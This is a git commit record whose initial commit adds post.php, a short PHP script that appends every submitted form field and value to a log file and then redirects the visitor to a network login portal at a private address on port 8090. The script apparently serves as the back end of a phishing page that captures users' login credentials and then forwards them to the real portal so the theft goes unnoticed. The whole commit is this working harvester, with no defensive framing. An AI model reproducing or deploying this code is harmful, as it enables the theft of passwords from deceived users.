261455c2a0f19f3c358986163b6cee288d59f8e6
Shivam Goyal <shivamgoyal1899@gmail.com>
2019-11-19 02:04:37 +0530

    Initial commit

---
+++ post.php
@@ -0,0 +1,13 @@
+<?php
+header ('Location: https://172.31.1.6:8090/');
+$handle = fopen("log.txt", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n\n\n\n");
+fclose($handle);
+exit;
+?>
